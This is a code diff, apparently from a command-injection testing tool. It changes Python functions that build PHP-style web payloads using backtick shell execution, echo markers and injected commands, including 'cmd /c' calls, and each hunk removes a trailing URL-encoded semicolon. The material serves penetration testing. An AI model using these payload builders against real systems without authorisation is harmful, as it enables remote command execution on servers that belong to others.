@@ -32,7 +32,7 @@ def decision(separator, TAG, randv1, randv2):
                   "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
                   "\"') do @set /p =%i <nul`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B" +
+                  "`echo " + TAG + "`)" +
                   separator
                 )
     else:
@@ -48,7 +48,7 @@ def decision(separator, TAG, randv1, randv2):
       payload = ("print(`echo " + TAG + "`." +
                   "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B" +
+                  "`echo " + TAG + "`)" +
                   separator
                 )
     else:
@@ -70,7 +70,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
       payload = ("print(`echo " + TAG + "`." +
                   "` cmd /c " + python_payload + "`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B" +
+                  "`echo " + TAG + "`)" +
                   separator
                 )
     else:
@@ -85,7 +85,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
       payload = ("print(`echo " + TAG + "`." +
                   "` " + python_payload + "`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B" +
+                  "`echo " + TAG + "`)" +
                   separator
                 )
     else:
@@ -111,7 +111,7 @@ def cmd_execution(separator, TAG, cmd):
                   "`echo " + TAG + "`." +
                   "` cmd /c " + cmd + "`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B"
+                  "`echo " + TAG + "`)"
                 )
 
     else:
@@ -127,7 +127,7 @@ def cmd_execution(separator, TAG, cmd):
                   "`echo " + TAG + "`." +
                   "`" + cmd + "`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B"
+                  "`echo " + TAG + "`)"
                 )
     else:
       payload = ("print(`echo '" + TAG + "'" + 
@@ -158,7 +158,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                     "`echo " + TAG + "`." +
                     "` cmd /c " + python_payload + "`." +
                     "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)%3B"
+                    "`echo " + TAG + "`)"
                   )
       else:
         payload = ("print(`echo '" + TAG + "'" + 
@@ -173,7 +173,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                   "`echo " + TAG + "`." +
                   "`" + cmd + "`." +
                   "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)%3B"
+                  "`echo " + TAG + "`)"
                 )
     else:
       payload = ("print(`echo '" + TAG + "'" + 
